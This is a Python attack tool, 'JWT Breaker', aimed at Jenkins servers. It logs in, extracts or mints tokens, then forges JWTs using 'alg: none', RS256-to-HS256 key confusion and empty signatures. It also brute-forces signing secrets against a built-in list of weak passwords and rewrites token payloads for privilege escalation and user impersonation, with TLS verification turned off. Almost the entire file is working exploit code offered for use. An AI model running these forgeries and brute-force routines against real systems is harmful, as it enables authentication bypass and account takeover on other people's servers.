#!/usr/bin/env python3
"""
JWT Breaker - Advanced JWT Token Cryptanalysis for Jenkins
Implements algorithm confusion attacks, weak secret detection, and signature bypass techniques
"""

import jwt
import base64
import json
import hashlib
import hmac
import requests
from typing import Dict, List, Optional, Tuple
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
import itertools
import string

console = Console()

class JWTBreaker:
    """Comprehensive JWT token analysis and exploitation"""
    
    def __init__(self, jenkins_url: str, username: str = None, password: str = None):
        self.jenkins_url = jenkins_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        self.findings = []
        self.cracked_tokens = []
        
    def analyze_token(self, token: str) -> Dict:
        """Decode and analyze JWT token structure"""
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            parts = token.split('.')
            signature = parts[2] if len(parts) == 3 else None
            
            analysis = {
                "header": header,
                "payload": payload,
                "signature": signature,
                "algorithm": header.get("alg", "unknown"),
                "key_id": header.get("kid"),
                "vulnerabilities": []
            }
            
            if header.get("alg") == "none":
                analysis["vulnerabilities"].append("Algorithm set to 'none' - no signature verification")
            
            if "HS256" in header.get("alg", ""):
                analysis["vulnerabilities"].append("Symmetric algorithm - susceptible to brute force")
            
            if header.get("typ") != "JWT":
                analysis["vulnerabilities"].append(f"Non-standard type: {header.get('typ')}")
            
            console.print("[green][PASS] Token decoded successfully[/green]")
            self._print_token_info(analysis)
            
            return analysis
            
        except Exception as e:
            console.print(f"[red][FAIL] Failed to decode token: {e}[/red]")
            return {}
    
    def _print_token_info(self, analysis: Dict):
        """Display token information in formatted table"""
        table = Table(title="JWT Token Analysis", show_header=True, header_style="bold magenta")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="green")
        
        table.add_row("Algorithm", analysis.get("algorithm", "unknown"))
        table.add_row("Key ID", str(analysis.get("key_id", "None")))
        table.add_row("Payload Fields", ", ".join(analysis.get("payload", {}).keys()))
        
        if analysis.get("vulnerabilities"):
            table.add_row("Vulnerabilities", "\\n".join(analysis["vulnerabilities"]))
        
        console.print(table)
    
    def extract_jenkins_jwt(self) -> Optional[str]:
        """Extract JWT token from Jenkins session"""
        console.print("[cyan][*] Attempting to extract JWT from Jenkins[/cyan]")
        
        try:
            if self.username and self.password:
                login_url = f"{self.jenkins_url}/j_security_check"
                data = {
                    "j_username": self.username,
                    "j_password": self.password,
                    "from": "/",
                    "Submit": "Sign in"
                }
                resp = self.session.post(login_url, data=data, allow_redirects=False)
                
                if 'Authorization' in self.session.headers:
                    token = self.session.headers['Authorization'].replace('Bearer ', '')
                    console.print("[green][PASS] JWT token extracted from Authorization header[/green]")
                    return token
                
                for cookie in self.session.cookies:
                    if 'jwt' in cookie.name.lower() or 'token' in cookie.name.lower():
                        console.print(f"[green][PASS] JWT token found in cookie: {cookie.name}[/green]")
                        return cookie.value
                
                api_token_url = f"{self.jenkins_url}/user/{self.username}/descriptorByName/jenkins.security.ApiTokenProperty/generateNewToken"
                resp = self.session.post(api_token_url, data={"newTokenName": "test_token"})
                
                if resp.status_code == 200:
                    data = resp.json()
                    if 'data' in data and 'tokenValue' in data['data']:
                        token = data['data']['tokenValue']
                        if self._is_jwt(token):
                            console.print("[green][PASS] JWT token extracted from API[/green]")
                            return token
            
            console.print("[yellow][WARN] No JWT token found in Jenkins session[/yellow]")
            return None
            
        except Exception as e:
            console.print(f"[red][FAIL] Failed to extract JWT: {e}[/red]")
            return None
    
    def _is_jwt(self, token: str) -> bool:
        """Check if string is a valid JWT format"""
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        try:
            base64.urlsafe_b64decode(parts[0] + '==')
            base64.urlsafe_b64decode(parts[1] + '==')
            return True
        except:
            return False
    
    def algorithm_confusion_attack(self, token: str, public_key: str = None) -> List[str]:
        """Execute algorithm confusion attacks (RS256 -> HS256, alg: none)"""
        console.print("[yellow][*] Executing algorithm confusion attacks[/yellow]")
        
        forged_tokens = []
        
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
            
            none_token = self._forge_token_none_alg(payload)
            forged_tokens.append(("none_algorithm", none_token))
            console.print("[green][PASS] Created 'alg: none' token[/green]")
            
            if public_key:
                hs256_token = self._forge_token_rs256_to_hs256(payload, public_key)
                forged_tokens.append(("rs256_to_hs256", hs256_token))
                console.print("[green][PASS] Created RS256->HS256 confusion token[/green]")
            
            null_sig_token = self._forge_token_null_signature(payload)
            forged_tokens.append(("null_signature", null_sig_token))
            console.print("[green][PASS] Created null signature token[/green]")
            
            self.findings.append({
                "type": "algorithm_confusion",
                "severity": "critical",
                "description": f"Generated {len(forged_tokens)} algorithm confusion tokens",
                "tokens": forged_tokens
            })
            
            return forged_tokens
            
        except Exception as e:
            console.print(f"[red][FAIL] Algorithm confusion attack failed: {e}[/red]")
            return []
    
    def _forge_token_none_alg(self, payload: Dict) -> str:
        """Create token with algorithm 'none'"""
        header = {"alg": "none", "typ": "JWT"}
        
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def _forge_token_rs256_to_hs256(self, payload: Dict, public_key: str) -> str:
        """Convert RS256 token to HS256 using public key as secret"""
        header = {"alg": "HS256", "typ": "JWT"}
        
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        message = f"{header_b64}.{payload_b64}".encode()
        signature = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.{signature_b64}"
    
    def _forge_token_null_signature(self, payload: Dict) -> str:
        """Create token with empty signature"""
        header = {"alg": "HS256", "typ": "JWT"}
        
        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def brute_force_secret(self, token: str, wordlist: List[str] = None) -> Optional[str]:
        """Brute force JWT secret using wordlist"""
        console.print("[yellow][*] Starting JWT secret brute force[/yellow]")
        
        if not wordlist:
            wordlist = self._get_default_wordlist()
        
        header = jwt.get_unverified_header(token)
        
        if header.get("alg") not in ["HS256", "HS384", "HS512"]:
            console.print(f"[red][FAIL] Algorithm {header.get('alg')} not suitable for brute force[/red]")
            return None
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Brute forcing...", total=len(wordlist))
            
            for secret in wordlist:
                try:
                    jwt.decode(token, secret, algorithms=[header.get("alg")])
                    console.print(f"[green][PASS] Secret found: {secret}[/green]")
                    
                    self.findings.append({
                        "type": "weak_secret",
                        "severity": "critical",
                        "description": f"JWT signed with weak secret: {secret}",
                        "secret": secret
                    })
                    
                    self.cracked_tokens.append((token, secret))
                    return secret
                    
                except jwt.InvalidSignatureError:
                    pass
                except Exception:
                    pass
                
                progress.update(task, advance=1)
        
        console.print("[red][FAIL] Secret not found in wordlist[/red]")
        return None
    
    def _get_default_wordlist(self) -> List[str]:
        """Generate default wordlist for JWT brute force"""
        return [
            "secret", "password", "123456", "admin", "root", "test",
            "jenkins", "changeme", "default", "qwerty", "letmein",
            "password123", "admin123", "jenkins123", "P@ssw0rd",
            "secret123", "abc123", "pass", "key", "mykey",
            "your-256-bit-secret", "your-secret-key", "secretkey",
            "dev", "development", "production", "staging", "test123",
            "", "null", "undefined", "none", "empty"
        ]
    
    def manipulate_payload(self, token: str, modifications: Dict) -> str:
        """Modify JWT payload (privilege escalation, user impersonation)"""
        console.print("[yellow][*] Manipulating JWT payload[/yellow]")
        
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            for key, value in modifications.items():
                old_value = payload.get(key, "N/A")
                payload[key] = value
                console.print(f"[cyan][*] Modified {key}: {old_value} -> {value}[/cyan]")
            
            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            
            modified_token = f"{header_b64}.{payload_b64}."
            
            console.print("[green][PASS] Payload modified (signature removed)[/green]")
            
            return modified_token
            
        except Exception as e:
            console.print(f"[red][FAIL] Payload manipulation failed: {e}[/red]")
            return token
    
    def export_findings(self, filename: str = "jwt_findings.json"):
        """Export all findings to JSON file"""
        output = {
            "jenkins_url": self.jenkins_url,
            "findings": self.findings,
            "cracked_tokens": [{"token": t[:20] + "...", "secret": s} for t, s in self.cracked_tokens],
            "total_vulnerabilities": len(self.findings)
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        console.print(f"[green][PASS] Findings exported to {filename}[/green]")
    
    def print_summary(self):
        """Print summary of all findings"""
        table = Table(title="JWT Analysis Summary", show_header=True, header_style="bold magenta")
        table.add_column("Category", style="cyan")
        table.add_column("Count", style="green")
        table.add_column("Severity", style="red")
        
        categories = {}
        for finding in self.findings:
            ftype = finding["type"]
            if ftype not in categories:
                categories[ftype] = {"count": 0, "severity": finding["severity"]}
            categories[ftype]["count"] += 1
        
        for category, data in categories.items():
            table.add_row(
                category.replace('_', ' ').title(),
                str(data["count"]),
                data["severity"].upper()
            )
        
        console.print(table)
        console.print(f"\\n[cyan]Total Findings: {len(self.findings)}[/cyan]")
        console.print(f"[cyan]Cracked Tokens: {len(self.cracked_tokens)}[/cyan]")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="JWT Breaker - Advanced JWT Cryptanalysis")
    parser.add_argument("--url", required=True, help="Jenkins URL")
    parser.add_argument("--username", help="Jenkins username")
    parser.add_argument("--password", help="Jenkins password")
    parser.add_argument("--token", help="JWT token to analyze")
    parser.add_argument("--wordlist", help="Path to wordlist for brute force")
    parser.add_argument("--output", default="jwt_findings.json", help="Output file")
    
    args = parser.parse_args()
    
    breaker = JWTBreaker(args.url, args.username, args.password)
    
    token = args.token
    if not token:
        token = breaker.extract_jenkins_jwt()
    
    if token:
        console.print("\\n[bold cyan]===== JWT Token Analysis =====[/bold cyan]\\n")
        analysis = breaker.analyze_token(token)
        
        console.print("\\n[bold cyan]===== Algorithm Confusion Attack =====[/bold cyan]\\n")
        forged = breaker.algorithm_confusion_attack(token)
        
        console.print("\\n[bold cyan]===== Secret Brute Force =====[/bold cyan]\\n")
        if args.wordlist:
            with open(args.wordlist, 'r') as f:
                wordlist = [line.strip() for line in f]
        else:
            wordlist = None
        secret = breaker.brute_force_secret(token, wordlist)
        
        console.print("\\n[bold cyan]===== Summary =====[/bold cyan]\\n")
        breaker.print_summary()
        breaker.export_findings(args.output)
    else:
        console.print("[red][FAIL] No JWT token available for analysis[/red]")
